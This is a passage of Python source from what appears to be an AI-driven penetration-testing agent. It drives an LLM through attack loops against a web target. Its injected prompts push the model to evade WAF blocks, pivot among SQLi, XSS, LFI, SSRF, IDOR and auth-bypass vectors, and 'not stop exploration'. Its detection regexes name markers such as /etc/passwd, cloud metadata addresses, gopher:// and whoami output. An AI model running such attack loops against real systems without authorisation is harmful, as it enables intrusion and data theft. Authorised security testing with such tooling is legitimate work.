                    from rich.panel import Panel as _PanelW
                    self.console.print(_PanelW(
                        _wtb_warn,
                        title="[bold yellow]WAF_TEMP_BLOCK — 일시적 차단[/bold yellow]",
                        border_style="yellow",
                    ))
                    self.history.append(Message(role="user", content=_wtb_warn))
                    continue  # TARGET_FAILED 중단 없이 루프 재개

                _fail_msg = {
                    "ko": "❌ 타겟 공략 실패 — 이 타겟에서는 취약점을 확인할 수 없습니다.",
                    "zh": "❌ 目标攻击失败 — 无法在此目标上确认漏洞。",
                    "en": "❌ Target failed — no confirmed vulnerability on this target.",
                }.get(_lang, "❌ Target failed.")
                _next_msg = {
                    "ko": "다른 URL/파라미터 또는 다른 타겟 도메인을 시도하세요.",
                    "zh": "请尝试不同的URL/参数或其他目标域名。",
                    "en": "Try a different URL/parameter or a different target domain.",
                }.get(_lang, "Try a different target.")
                from rich.panel import Panel as _Panel
                self.console.print(_Panel(
                    f"{_fail_msg}\n\n{_next_msg}",
                    title=f"[bold red]TARGET_FAILED[/bold red]",
                    border_style="red",
                ))
                self._auto_generate_report()
                break

            # Ctrl+C (응답 후) — 힌트 주입 후 계속 가능
            # v6.2.137: LOOP_LIMIT_STOP은 hint 없이 즉시 break
            if self._agent_stop_flag.is_set():
                self._agent_stop_flag.clear()
                if getattr(self, "_loop_limit_hit", False):
                    self._loop_limit_hit = False
                    break
                _hint2 = self._prompt_mid_task_hint()
                if _hint2:
                    _lang = getattr(self.config, "lang", "en")
                    _hint_injected2 = {
                        "ko": f"[사용자 힌트 — 즉시 반영]: {_hint2}",
                        "zh": f"[用户提示 — 立即应用]: {_hint2}",
                        "en": f"[USER HINT — apply immediately]: {_hint2}",
                    }.get(_lang, f"[USER HINT]: {_hint2}")
                    self.history.append(Message(role="user", content=_hint_injected2))
                    _resume_msg2 = {
                        "ko": f"💬 힌트 주입됨 — 루프 재개 (#{self._exec_loop_count})",
                        "zh": f"💬 提示已注入 — 继续循环 (#{self._exec_loop_count})",
                        "en": f"💬 Hint injected — resuming loop (#{self._exec_loop_count})",
                    }.get(_lang, f"💬 Hint injected — resuming")
                    self.console.print(f"[{THEME['success']}]{_resume_msg2}[/]\n")
                    # ★ 힌트 기반 AI 호출 — 새 응답을 current_response로 설정해야 루프가 올바르게 진행됨
                    model_hint2 = ModelRegistry.build(model_cfg)
                    self.console.print(f"\n[{THEME['secondary']}]{_s['exec_analyzing']}[/]")
                    _hint2_response = self._stream_response(
                        model_hint2.chat_stream(self._build_messages(""))
                    )
                    if _hint2_response:
                        self.history.append(Message(role="assistant", content=_hint2_response))
                        self._append_to_session_log("assistant", _hint2_response)
                        current_response = _hint2_response  # ★ current_response 업데이트 필수
                    continue
                else:
                    self.console.print(f"\n[{THEME['warn']}]⚠ {_s.get('agent_interrupted', 'Agent loop interrupted')}[/]\n")
                    self._auto_generate_report()
                    break

            # Stuck 감지 — 최근 5루프 중 3개 동일하면 전략 전환, 5개 전부 동일하면 보고서 후 종료
            _result_hash = str(hash(followup_response[:500]))
            self._recent_results.append(_result_hash)
            if len(self._recent_results) > 5:
                self._recent_results.pop(0)

            _last5 = self._recent_results
            _is_hard_stuck = len(_last5) >= 5 and len(set(_last5)) == 1
            _is_soft_stuck = len(_last5) >= 3 and len(set(_last5[-3:])) == 1

            if _is_hard_stuck:
                _stuck_counts = BingoTerminal._finding_evidence_counts(
                    getattr(self, "_findings_exporter", None)
                )
                _stuck_defer_reason = BingoTerminal._auto_report_defer_reason(
                    followup_response,
                    _stuck_counts,
                    getattr(self, "_exec_loop_count", 0),
                    trigger="hard_stuck",
                )
                if _stuck_defer_reason:
                    self.history.append(Message(
                        role="user",
                        content=(
                            "[STUCK_BUT_REPORT_DEFERRED]\n"
                            f"Reason: {_stuck_defer_reason}\n"
                            "The current loop is stuck, but there is not enough evidence for an automatic report. "
                            "Switch to a different vector and emit one concrete executable action."
                        ),
                    ))
                    self._stuck_count = 0
                    self._recent_results.clear()
                    continue
                # 5루프 전부 동일 → 더 이상 진전 불가, 보고서 생성 후 종료
                self.console.print(
                    f"\n[{THEME['warn']}]⚠ {_s.get('agent_stuck', 'Agent stuck — generating report')}...[/]\n"
                )
                self._auto_generate_report()
                self._stuck_count = 0
                self._recent_results.clear()
                break
            elif _is_soft_stuck:
                self._stuck_count += 1
                # 전략 전환 요청 — 루프는 계속
                self.history.append(Message(
                    role="user",
                    content=(
                        "[STRATEGY CHANGE REQUIRED]\n"
                        "The last 3 loops produced identical results — you are STUCK.\n"
                        "You MUST switch to a completely different attack vector:\n"
                        "- If WAF blocked all SQL: try Time-based, different param, or header injection\n"
                        "- If no SQLi: pivot to XSS, LFI, IDOR, or auth bypass\n"
                        "- If stuck on extraction: try a shorter query or different encoding\n"
                        "Make a decisive pivot NOW. Do NOT repeat the same payload."
                    )
                ))
            else:
                self._stuck_count = 0

            # 루프 상태 표시 (횟수 제한 없음 — AI 자율 완료 판단)
            self.console.print(
                f"[{THEME['dim']}]🔄 {_s.get('agent_loop', 'Agent loop')} "
                f"#{self._exec_loop_count}  "
                f"({_s.get('agent_ctrl_c', 'Ctrl+C to stop')})[/]"
            )

            # 스킬 로드 체크 (followup에 새 SKILL_LOAD 있으면 주입)
            new_skill_names = self._parse_skill_load_request(followup_response)
            new_new_skills = [s for s in new_skill_names if s not in _loaded_skills]
            if new_new_skills:
                _loaded_skills.update(new_new_skills)
                skill_content = self._load_skill_content(new_new_skills)
                if skill_content:
                    self.history.append(Message(
                        role="user",
                        content=(
                            "=== SKILL CONTENT INJECTED ===\n"
                            + skill_content
                            + "\n=== END SKILLS ===\n"
                            "Continue using this expert knowledge. "
                            "Do NOT redeclare loaded skills: "
                            + ", ".join(_loaded_skills)
                        )
                    ))
                    skill_model = ModelRegistry.build(model_cfg)
                    self.console.print(
                        f"\n[bold cyan]⚡ {_s.get('skill_applying', 'Applying skill...')} "
                        f"[{', '.join(new_new_skills)}][/bold cyan]"
                    )
                    followup_response = self._stream_response(
                        skill_model.chat_stream(self._build_messages(""))
                    )
                    self.history.append(Message(role="assistant", content=followup_response))

            current_response = followup_response

    # ── v4.8.0: 실행 결과 후처리 — 빈값 VERIFIED + SLEEP 판정 오류 교정 ─────────
    def _postcheck_exec_output(self, output: str) -> str:
        """코드 실행 결과(print 출력)에서 두 가지 오탐을 감지하고 경고 주입.

        f3: [VERIFIED] 빈값 — ✅ [VERIFIED] DB名: <빈문자열> 형태 감지 → 경고로 교체
        f5: SLEEP 판정 반전 — elapsed < threshold인데 ✅로 표시된 경우 → ❌로 교정
        """
        import re as _pc_re
        lines = output.splitlines()
        corrected = []
        _warned = False

        for line in lines:
            # ── f3: [VERIFIED] 빈값 오탐 감지 ────────────────────────────────
            # 패턴: ✅ [VERIFIED] 어떤라벨: (빈값 또는 공백만)
            _verified_empty = _pc_re.match(
                r'^.*?\[VERIFIED\]\s*[^\s:：]+\s*[：:]\s*$',
                line.rstrip()
            )
            if _verified_empty:
                corrected.append(
                    line + "  ← ⚠️ [BINGO v4.8.0] VERIFIED_EMPTY_BLOCKED: "
                    "추출값이 비어 있음 — [VERIFIED] 태그 무효. 실제 값이 있을 때만 사용."
                )
                _warned = True
                continue

            # ── v4.9.4: Oracle 실패 감지 — 반복 문자 추출 ───────────────────────
            # 패턴: ✅ USER(): 'aaaaaaaaaa' 또는 DATABASE(): 'bbbbbbbbbb'
            # oracle 무효 시 동일 문자가 계속 'hit'으로 판정돼 반복됨
            _oracle_fail = _pc_re.search(
                r'[\'"]([a-zA-Z])\1{9,}[\'"]',   # 동일 문자 10개 이상 반복
                line
            )
            if _oracle_fail:
                corrected.append(
                    line + "  ← ⚠️ [BINGO v4.9.4] ORACLE_FAILURE_DETECTED: "
                    "추출값 동일 문자 반복 → Oracle 무효로 인한 오탐. "
                    "이 추출 결과 신뢰 불가 — 즉시 중단하고 다른 기법으로 전환 필요."
                )
                _warned = True
                continue

            # ── f5: SLEEP 판정 반전 버그 감지 ────────────────────────────────
            # 패턴: [SLEEP(N)] 耗时: X.XXs | 阈值: Y.Ys | ✅ 확인...
            # elapsed < threshold 인데 ✅로 표시된 경우 → ❌로 교정
            _sleep_match = _pc_re.search(
                r'\[?SLEEP\s*\((\d+)\)\]?\s*.*?(?:耗时|elapsed|지연)[：:\s]*(\d+\.?\d*)\s*s'
                r'.*?(?:阈值|threshold|임계값)[：:\s]*(\d+\.?\d*)\s*s',
                line, _pc_re.IGNORECASE
            )
            if _sleep_match:
                try:
                    _n = int(_sleep_match.group(1))
                    _elapsed = float(_sleep_match.group(2))
                    _reported_thresh = float(_sleep_match.group(3))
                    _correct_thresh = _n * 0.8   # 단일 기준: 80%
                    _should_pass = _elapsed >= _correct_thresh
                    _reported_pass = '✅' in line

                    if _reported_pass and not _should_pass:
                        # 판정 반전 버그: ✅인데 실제로는 실패
                        corrected.append(
                            line.replace('✅', '❌')
                            + f"  ← ⚠️ [BINGO v4.8.0] SLEEP_JUDGMENT_CORRECTED: "
                            f"elapsed({_elapsed}s) < threshold({_correct_thresh}s=SLEEP({_n})×0.8) "
                            f"→ ❌ NOT VALID (was incorrectly ✅)"
                        )
                        _warned = True
                        continue
                except (ValueError, IndexError):
                    pass

            corrected.append(line)

        result = '\n'.join(corrected)
        if _warned and hasattr(self, 'console'):
            _lang = getattr(self.config, "lang", "en")
            _warn_msg = {
                "ko": "⚠️ [v4.8.0] 실행 결과 오탐 감지 — 위 경고 메시지 확인",
                "zh": "⚠️ [v4.8.0] 检测到执行结果误报 — 请查看上方警告",
                "en": "⚠️ [v4.8.0] Exec output anomaly detected — see warnings above",
            }.get(_lang, "⚠️ [v4.8.0] Exec output anomaly detected — see warnings above")
            self.console.print(f"[bold yellow]{_warn_msg}[/bold yellow]")
        return result

    # ── v3.2.96: 실시간 발견 감지 + XSS Playwright 자동 검증 ──────────────────
    def _show_finding_autocorrection(self, reason: str) -> None:
        """Render a localized message for a FindingsExporter correction."""
        if reason == "xss_browser_negative":
            key = "fe_xss_negative_autocorrected"
            fallback = "[Auto-correct] Negative browser verification removed the XSS candidate"
        elif reason.startswith("xss_"):
            key = "fe_pattern_fp_autocorrected"
            fallback = "[Auto-correct] Generic page script excluded from XSS findings"
        else:
            key = "fe_inactive_pattern_autocorrected"
            fallback = "[Auto-correct] Pattern without active-test evidence excluded from findings"
        message = self.s.get(key, fallback)
        vtype = reason.split("_pattern_", 1)[0].upper() if "_pattern_" in reason else ""
        try:
            message = str(message).format(vtype=vtype)
        except (KeyError, ValueError):
            message = str(message)
        self.console.print(f"[{THEME['dim']}]{message}[/]")

    def _show_finding_quarantine(self, reason: str) -> None:
        message = self.s.get(
            "fe_inactive_pattern_quarantined",
            "[Quarantine] Pattern could not be tied to an active test; retained for revalidation",
        )
        vtype = reason.split("_pattern_", 1)[0].upper() if "_pattern_" in reason else "UNKNOWN"
        try:
            message = str(message).format(vtype=vtype)
        except (KeyError, ValueError):
            message = str(message)
        self.console.print(f"[{THEME['dim']}]{message}[/]")
        queued = self.s.get(
            "fe_verification_queued",
            "Candidate retained and queued for independent verification",
        )
        self.console.print(f"[{THEME['dim']}]{queued}[/]")

    def _verification_backlog_context(self, limit: int = 3) -> str:
        """Build bounded verifier tasks without suppressing the attack path."""
        exporter = getattr(self, "_findings_exporter", None)
        if exporter is None or not hasattr(exporter, "verification_backlog"):
            return ""
        attempts = getattr(self, "_verification_queue_attempts", None)
        if not isinstance(attempts, dict):
            attempts = {}
            self._verification_queue_attempts = attempts
        selected = []
        for item in exporter.verification_backlog(limit=10):
            finding_id = str(item.get("id", ""))
            if not finding_id or attempts.get(finding_id, 0) >= 2:
                continue
            attempts[finding_id] = attempts.get(finding_id, 0) + 1
            selected.append(item)
            if len(selected) >= limit:
                break
        if not selected:
            return ""

        lines = [
            "\n[AUTO_VERIFICATION_QUEUE]",
            "These are unresolved candidates, NOT confirmed vulnerabilities.",
            "Run the independent verifier now while continuing exploration.",
            "A deterministic negative result may reject the candidate; a timeout/error must retain it.",
            "Never promote from descriptive text, HTTP status, reflection, or process elapsed alone.",
        ]
        for item in selected:
            lines.append(
                f"- {item['id']} tier={item['tier']} type={item['type']} "
                f"endpoint={item['endpoint']} param={item['parameter']} "
                f"verifier={item['tool']} required={item['required_evidence']}"
            )
        lines.append("[/AUTO_VERIFICATION_QUEUE]\n")
        return "\n".join(lines)

    def _adaptive_attack_pivot_context(self, code: str, output: str) -> str:
        """Pivot after repeated inconclusive attempts without dropping candidates."""
        import re as _pivot_re

        blob = f"{code}\n{output}".lower()
        vector_patterns = [
            ("sqli", r'sqli|sql\s*inject|union\s+(?:all\s+)?select|sleep\s*\(|sqlmap|ghauri|boolean.?oracle'),
            ("xss", r'\bxss\b|<script|onerror\s*=|javascript\s*:'),
            ("ssrf", r'\bssrf\b|169\.254\.169\.254|metadata\.google|gopher://'),
            ("lfi", r'\blfi\b|path.?travers|\.\./\.\./|/etc/passwd'),
            ("rce", r'\brce\b|command.?inject|cmdi|whoami|uid=\d+\('),
            ("idor", r'\bidor\b|bola|other_user_id|horizontal.?privilege'),
            ("auth", r'auth.?bypass|login.?bypass|session.?fix|jwt'),
        ]
        vector = next(
            (name for name, pattern in vector_patterns if _pivot_re.search(pattern, blob, _pivot_re.I)),
            "",
        )
        if not vector:
            return ""

        profiles = {
            "sqli": [
                ("built_in_auto", "sqli_autoexploit with preserved URL/method/param/session"),
                ("error", "DB-specific error probes with negative controls"),
                ("boolean", "stable TRUE/FALSE oracle with repeated samples"),
                ("time", "baseline plus 3+ time-delay samples"),
                ("union", "UNION column-count and typed extraction"),
                ("custom_oracle", "custom run_python oracle with calibration"),
                ("external", "sqlmap and ghauri using the same request/session/tamper profile"),
            ],
            "xss": [
                ("reflection", "context-aware reflection probe"),
                ("attribute", "attribute/event-handler context breakout"),
                ("dom", "DOM sink/source tracing with browser execution"),
                ("stored", "stored-XSS write/read verification"),
                ("browser", "xss_autotest plus Playwright dialog proof"),
            ],
            "ssrf": [
                ("direct", "direct internal URL with baseline comparison"),
                ("redirect", "same-host redirect chain to internal address"),
                ("encoding", "IPv6/dword/octal/DNS address variants"),
                ("oob", "DNS/HTTP out-of-band callback verification"),
                ("protocol", "gopher/file protocol capability checks"),
            ],
            "lfi": [
                ("traversal", "depth and encoding traversal matrix"),
                ("wrapper", "language wrapper/filter variants"),
                ("log", "log/session file inclusion verification"),
                ("tool", "lfi_autotest with exact file signatures"),
            ],
            "rce": [
                ("canary", "unique command canary with negative control"),
                ("separator", "shell separator and newline variants"),
                ("blind", "time and out-of-band command proof"),
                ("tool", "cmdi_autotest with OS-specific payloads"),
            ],
            "idor": [
                ("object", "same endpoint with controlled object-ID changes"),
                ("session", "two-session owner/non-owner comparison"),
                ("method", "GET/POST/PUT method and body-location variants"),
                ("tool", "idor_autotest with response-structure comparison"),
            ],
            "auth": [
                ("session", "authenticated vs unauthenticated session control"),
                ("parameter", "role/user parameter and mass-assignment checks"),
                ("token", "JWT algorithm/key/claim validation"),
                ("workflow", "password-reset and OAuth state/redirect checks"),
            ],
        }

        if vector == "sqli":
            technique_checks = [
                ("external", r'\bsqlmap\b|\bghauri\b'),
                ("custom_oracle", r'def\s+(?:oracle|extract_)|string\.printable'),
                ("union", r'union\s+(?:all\s+)?select'),
                ("time", r'sleep\s*\(|benchmark\s*\(|waitfor\s+delay'),
                ("boolean", r'1\s*=\s*1|true.{0,30}false|boolean.?oracle'),
                ("error", r'extractvalue|updatexml|sqlstate|ora-\d+'),
                ("built_in_auto", r'sqli_autoexploit|bool_oracle_extract'),
            ]
        else:
            technique_checks = [
                (name, _pivot_re.escape(name)) for name, _ in profiles[vector]
            ]
        technique = next(
            (name for name, pattern in technique_checks if _pivot_re.search(pattern, blob, _pivot_re.I)),
            profiles[vector][0][0],
        )

        # Type-specific proof or an already confirmed finding ends the pivot cycle.
        finding_types = {
            "auth": {"auth", "auth_bypass"},
            "idor": {"idor", "auth_bypass"},
        }.get(vector, {vector})
        confirmed = any(
            getattr(finding, "vuln_type", "") in finding_types
            and getattr(finding, "confidence", "") == "confirmed"
            for finding in getattr(getattr(self, "_findings_exporter", None), "findings", [])
        )
        proof_patterns = {
            "sqli": r'\[SQLI_CONFIRMED\]|SQLSTATE\[|ORA-\d{4,}|\[TIME_BASED\][^\n]*samples=(?:[3-9]|\d{2,})',
            "xss": r'XSS_BROWSER_CONFIRMED|browser execution confirmed',
            "ssrf": r'AccessKeyId|ami-id|metadata-flavor\s*:\s*google',
            "lfi": r'(?:^|\n)root:x:0:0:',
            "rce": r'uid=\d+\([^)]+\).*gid=\d+|RCE_CANARY_',
            "idor": r'IDOR_CONTROL_VERIFIED',
            "auth": r'LOGIN_CONTROL_VERIFIED|login_verified\s*=\s*true',
        }
        if confirmed or _pivot_re.search(proof_patterns[vector], output, _pivot_re.I):
            state = getattr(self, "_adaptive_attack_state", {})
            state.pop(vector, None)
            self._adaptive_attack_state = state
            return ""

        state = getattr(self, "_adaptive_attack_state", None)
        target = getattr(self, "_agent_state", {}).get("target", "")
        if not isinstance(state, dict) or state.get("_target") != target:
            state = {"_target": target}
            self._adaptive_attack_state = state
        vector_state = state.setdefault(
            vector, {"counts": {}, "tried": set(), "blocked_attempts": 0}
        )
        if _pivot_re.search(
            r"\b(?:403|598B|199B)\b|waf|blocked|inconclusive|unstable|"
            r"SQLI_ORACLE_REJECTED|SQLI_EXTRACTION_FAILURE|oracle.*(?:fail|invalid)",
            output,
            _pivot_re.I,
        ):
            vector_state["blocked_attempts"] = vector_state.get("blocked_attempts", 0) + 1
        vector_state["tried"].add(technique)
        count = vector_state["counts"].get(technique, 0) + 1
        vector_state["counts"][technique] = count
        blocked_attempts = vector_state.get("blocked_attempts", 0)
        if (count < 2 or count % 2) and blocked_attempts < 2:
            return ""

        if vector == "sqli" and blocked_attempts >= 2:
            next_name, next_action = (
                "cross_vector",
                "switch to JS/API/IDOR and preserve this SQLi candidate for later verification",
            )
            vector_state["cooldown"] = 2
        else:
            next_name, next_action = next(
                (
                    (name, action)
                    for name, action in profiles[vector]
                    if name not in vector_state["tried"]
                ),
                (
                    "cross_vector",
                    "switch to JS/API/IDOR and preserve this candidate for later verification",
                ),
            )
        vector_state["tried"].add(next_name)
        return (
            "\n[ADAPTIVE_OFFENSE_PIVOT]\n"
            f"vector={vector} previous={technique} attempts={count} next={next_name}\n"
            f"ACTION: {next_action}.\n"
            "Preserve the candidate, target, endpoint, parameter, session, headers, and controls. "
            "Change technique now; do not repeat the same request and do not stop exploration. "
            "When next=cross_vector, prefer another vector unless a distinct SQLi/WAF verifier "
            "is justified by new evidence. Current executable tools are not suppressed.\n"
            "[/ADAPTIVE_OFFENSE_PIVOT]\n"
        )

    def _auto_analyze_findings(
        self,
        exec_output: str,
        code_snippet: str = "",
        execution_context: dict | None = None,
    ) -> None:
        """코드 실행 결과에서 취약점 발견을 감지하고 JSON 자동 누적 저장.
        XSS payload URL이 감지되면 Playwright로 2차 검증을 수행."""
        if not exec_output or len(exec_output.strip()) < 15:
            return

        _lang = getattr(self.config, "lang", "en")

        # ── target 동기화 ────────────────────────────────────────────
        _target = self._agent_state.get("target", "") or ""
        if _target and self._findings_exporter.target != _target:
            # 타겟이 변경됐으면 새 exporter 생성
            from ..tools.findings_exporter import FindingsExporter
            self._findings_exporter = FindingsExporter(target=_target)
            self._verification_queue_attempts = {}

        # ── 발견 탐지 ─────────────────────────────────────────────────
        finding = self._findings_exporter.process(
            output=exec_output,
            code_snippet=code_snippet[:16_384] if code_snippet else "",
            execution_context=execution_context,
        )
        if not finding:
            quarantine_reason = getattr(
                self._findings_exporter, "last_quarantine_reason", ""
            )
            if quarantine_reason:
                self._show_finding_quarantine(quarantine_reason)
                return
            correction = getattr(self._findings_exporter, "last_autocorrection", "")
            if correction:
                self._show_finding_autocorrection(correction)
            return

        # Verify an actionable XSS URL before presenting a finding panel. A
        # deterministic negative result removes the candidate automatically.
        if finding.vuln_type == "xss":
            xss_urls = self._findings_exporter.extract_xss_urls(exec_output)
            if xss_urls:
                self._playwright_verify_xss(finding, xss_urls)
                if finding not in self._findings_exporter.findings:
                    return

        # ── v6.2.76/175: 취약점 알림 박스 (blocked는 별도 톤) ──────────
        from rich.panel import Panel as _AlertPanel
        from rich.markup import escape as _alert_esc
        _conf = getattr(finding, "confidence", "") or ""
        if _conf == "blocked":
            _sev_color, _sev_label = ("#ffaa00", f"BLOCKED:{getattr(finding, 'reason_code', '')}")
        else:
            _sev_map = {
                "CRITICAL": ("#ff1744", "POTENTIAL CRITICAL" if _conf == "potential" else "CRITICAL"),
                "HIGH":     ("#ffd600", "POTENTIAL HIGH" if _conf == "potential" else "HIGH"),
                "LOW":      ("#4a4a4a", "LOW"),
            }
            _sev_color, _sev_label = _sev_map.get(
                finding.severity, ("#ffd600", finding.severity)
            )
        _fe_title = self.s.get(
            "fe_finding_detected",
            {"ko": "취약점 발견", "zh": "漏洞发现", "en": "Finding Detected"},
        )
        if _conf == "blocked":
            _fe_title = {
                "ko": "WAF/차단 이벤트 (SQLi 미증명)",
                "zh": "WAF/阻断事件 (SQLi未证明)",
                "en": "WAF/Block Event (SQLi unproven)",
            }
        elif _conf == "potential":
            _fe_title = self.s.get(
                "fe_candidate_detected",
                {"ko": "검증 필요 후보", "zh": "待验证候选", "en": "Candidate Requires Verification"},
            )
        _fe_title_str = _fe_title.get(_lang, _fe_title.get("en", "Finding Detected")) \
            if isinstance(_fe_title, dict) else str(_fe_title)

        _vuln_body = (
            f"[{_sev_color}]! {_sev_label}[/]  —  {_fe_title_str}\n"
            f"[{THEME['dim']}]ID   :[/] {_alert_esc(finding.id)}\n"
            f"[{THEME['dim']}]Type :[/] [{_sev_color}]{_alert_esc(finding.vuln_type)}[/]\n"
            f"[{THEME['dim']}]Conf :[/] {_alert_esc(_conf or 'inconclusive')}"
            + (f"  reason={_alert_esc(getattr(finding, 'reason_code', '') or '-')}"
               if getattr(finding, "reason_code", "") else "")
        )
        self.console.print()
        self.console.print(_AlertPanel(
            _vuln_body,
            border_style=_sev_color,
            padding=(0, 2),
            width=62,
        ))

        # blocked finding은 XSS 검증/CRITICAL 알림 후속 스킵
        if _conf == "blocked":
            return

        # ── 자동 저장 (5개 발견마다 중간 저장) ───────────────────────
        if len(self._findings_exporter.findings) % 5 == 0:
            _saved = self._findings_exporter.save()
            if _saved:
                _fe_saved = self.s.get(
                    "fe_auto_saved",
                    {"ko": "📁 발견 자동 저장", "zh": "📁 发现自动保存", "en": "📁 Findings Auto-Saved"},
                )
                _fe_saved_str = _fe_saved.get(_lang, _fe_saved.get("en", "📁 Findings Auto-Saved")) \
                    if isinstance(_fe_saved, dict) else str(_fe_saved)
                self.console.print(
                    f"[#4a4a4a]{_fe_saved_str}: {_saved}[/]"
                )

    def _playwright_verify_xss(self, finding, xss_urls: list) -> None:
        """Playwright로 XSS URL을 실제 브라우저에서 검증. confirmed 여부를 finding에 반영."""
        try:
            from ..tools.playwright_engine import PlaywrightEngine
        except ImportError:
            return

        _lang = getattr(self.config, "lang", "en")
        _pw_msg = self.s.get(
            "fe_xss_verify",
            {"ko": "🌐 XSS 브라우저 검증 중...", "zh": "🌐 正在浏览器验证XSS...", "en": "🌐 Verifying XSS in browser..."},
        )
        _pw_msg_str = _pw_msg.get(_lang, _pw_msg.get("en", "🌐 Verifying XSS in browser...")) \
            if isinstance(_pw_msg, dict) else str(_pw_msg)

        self.console.print(f"[#00d4aa]{_pw_msg_str}[/]")

        try:
            engine = PlaywrightEngine(headless=True, timeout=15_000)
        except Exception:
            return

        confirmed_any = False
        verification_completed = False
        verification_errors = 0
        ss_path = ""
        import time as _t_pw
        import re as _re_pw

        for url in xss_urls[:3]:  # 최대 3개 URL 검증
            try:
                # param 추출: URL의 마지막 쿼리 파라미터
                _params_m = _re_pw.findall(r'[?&](\w+)=', url)
                _params = _params_m if _params_m else ["q"]
                if hasattr(engine, "dom_xss_test_detailed"):
                    confirmed_params, completed_n, errors_n = engine.dom_xss_test_detailed(
                        url, _params
                    )
                    verification_completed = verification_completed or completed_n > 0
                    verification_errors += errors_n
                else:
                    confirmed_params = engine.dom_xss_test(url, _params)
                    verification_completed = True
                if confirmed_params:
                    confirmed_any = True
                    # 스크린샷 저장
                    _br = engine.screenshot(url)
                    if _br.screenshot_b64:
                        import base64 as _b64
                        _ts_pw = _t_pw.strftime("%Y%m%d_%H%M%S")
                        _sc_dir = self._findings_exporter._dir
                        ss_path = str(_sc_dir / f"xss_proof_{_ts_pw}.png")
                        try:
                            with open(ss_path, "wb") as _f_ss:
                                _f_ss.write(_b64.b64decode(_br.screenshot_b64))
                        except Exception:
                            ss_path = ""
                    break
            except Exception:
                continue

        engine.close()

        if confirmed_any:
            self._findings_exporter.mark_confirmed(finding, screenshot_path=ss_path)
            _confirmed_msg = self.s.get(
                "fe_xss_confirmed",
                {"ko": "✅ XSS 브라우저 실행 확인됨 (CONFIRMED)", "zh": "✅ XSS 浏览器执行确认 (CONFIRMED)", "en": "✅ XSS Confirmed in Browser (CONFIRMED)"},
            )
            _confirmed_str = _confirmed_msg.get(_lang, _confirmed_msg.get("en", "✅ XSS Confirmed in Browser")) \
                if isinstance(_confirmed_msg, dict) else str(_confirmed_msg)
            self.console.print(f"[#00ff41]{_confirmed_str}[/]")
            if ss_path:
                self.console.print(f"[#4a4a4a]  Screenshot: {ss_path}[/]")
        elif verification_completed and verification_errors == 0 and self._findings_exporter.reject_finding(
            finding, "xss_browser_negative"
        ):
            self._show_finding_autocorrection("xss_browser_negative")
        else:
            _unconf_msg = self.s.get(
                "fe_xss_unconfirmed",
                {"ko": "⚠ XSS 브라우저 미확인 (수동 검증 필요)", "zh": "⚠ XSS 浏览器未确认(需手动验证)", "en": "⚠ XSS Not Auto-Confirmed (manual verify needed)"},
            )
            _unconf_str = _unconf_msg.get(_lang, _unconf_msg.get("en", "⚠ XSS Not Auto-Confirmed")) \
                if isinstance(_unconf_msg, dict) else str(_unconf_msg)
            if verification_errors:
                _verify_error = self.s.get(
                    "fe_xss_verify_error",
                    "browser verification error ({n}); candidate retained",
                )
                _unconf_str += " — " + str(_verify_error).format(n=verification_errors)
            self.console.print(f"[#ffaa00]{_unconf_str}[/]")

    def _render_hacker_report(self, md_text: str, target: str) -> None:
        """마크다운 보고서를 해커 스타일 터미널 UI로 렌더링한다.
        v6.2.80: 모든 박스를 Rich Panel로 교체 — CJK/이모지 폭 오계산 완전 해결.
        """
        import re
        from rich.panel import Panel as _P
        from rich.text import Text as _T
        from rich.markup import escape as _esc
        from datetime import datetime as _dt

        # ── 심각도 색상 맵 ─────────────────────────────────────────────
        _sev_map = {
            "CRITICAL": "#ff1744", "Critical": "#ff1744",
            "HIGH":     "#ffd600", "High":     "#ffd600",
            "MEDIUM":   "#ff8f00", "Medium":   "#ff8f00",
            "LOW":      "#00e5ff", "Low":      "#00e5ff",
            "INFO":     "#ce93d8", "Info":     "#ce93d8",
        }

        def _apply_sev(txt: str) -> str:
            for kw, col in _sev_map.items():
                if kw in txt:
                    txt = txt.replace(kw, f"[{col}]{kw}[/]")
            return txt

        # ── 보고서 상단 배너 (Rich Panel) ─────────────────────────────
        _now = _dt.now().strftime("%Y-%m-%d  %H:%M:%S")
        _bt = _T()
        _bt.append("BINGO FIELD REPORT\n", style=THEME["primary"])
        _bt.append("─" * 48 + "\n", style=THEME["dim"])
        _bt.append("TARGET : ", style=THEME["dim"])
        _bt.append(_esc(target) + "\n", style=THEME["accent"])
        _bt.append("DATE   : ", style=THEME["dim"])
        _bt.append(_now, style=THEME["dim"])
        self.console.print()
        self.console.print(_P(_bt, border_style=THEME["primary"], padding=(0, 2)))

        # ── 섹션 색상 맵 ──────────────────────────────────────────────
        _section_colors = {
            "summary": THEME["secondary"], "요약": THEME["secondary"], "摘要": THEME["secondary"],
            "vulnerabilities": "#ffd600",  "취약점": "#ffd600",        "漏洞": "#ffd600",
            "vuln": "#ffd600",
            "evidence": "#ff8f00",         "증거": "#ff8f00",          "证据": "#ff8f00",
            "payload": "#ff8f00",
            "credentials": "#ff1744",      "자격증명": "#ff1744",      "凭据": "#ff1744",
            "credential": "#ff1744",
            "recommended": "#00e5ff",      "권고": "#00e5ff",          "修复": "#00e5ff",
            "fix": "#00e5ff", "remediation": "#00e5ff", "조치": "#00e5ff",
        }

        def _get_color(title: str) -> str:
            lc = title.lower()
            for kw, col in _section_colors.items():
                if kw in lc or kw in title:
                    return col
            return THEME["dim"]

        # ── 섹션별 파싱 → 각 섹션을 Rich Panel로 출력 ─────────────────
        _section_re = re.compile(r'^#{1,3}\s+(.+)$')
        _bullet_re  = re.compile(r'^[-*]\s+(.+)$')

        lines = md_text.splitlines()
        cur_title: str | None = None
        cur_color = THEME["dim"]
        sec_lines: list[str] = []

        def _flush(title: str | None, color: str, body: list[str]) -> None:
            """섹션 내용을 Rich Panel로 출력."""
            if not body:
                return
            ct = _T()
            for ln in body:
                if not ln.strip():
                    ct.append("\n")
                    continue
                m = _bullet_re.match(ln)
                display = f"  ▸ {m.group(1)}" if m else ln
                ct.append(_apply_sev(_esc(display)) + "\n")
            if ct.plain.strip():
                self.console.print(_P(
                    ct,
                    title=f"[{color}] {_esc(title)} [/]" if title else None,
                    border_style=color,
                    padding=(0, 2),
                ))

        for raw in lines:
            line = raw.rstrip()
            m_sec = _section_re.match(line)
            if m_sec:
                _flush(cur_title, cur_color, sec_lines)
                sec_lines = []
                cur_title = m_sec.group(1)
                cur_color = _get_color(cur_title)
            elif line.startswith("---") or line.startswith("==="):
                pass
            else:
                sec_lines.append(line)

        _flush(cur_title, cur_color, sec_lines)

        # ── 보고서 푸터 ────────────────────────────────────────────────
        self.console.print(
            f"\n[{THEME['dim']}]  END OF REPORT  ·  generated by bingo[/]\n"
        )

    @staticmethod
    def _build_html_report(
        md_text: str,
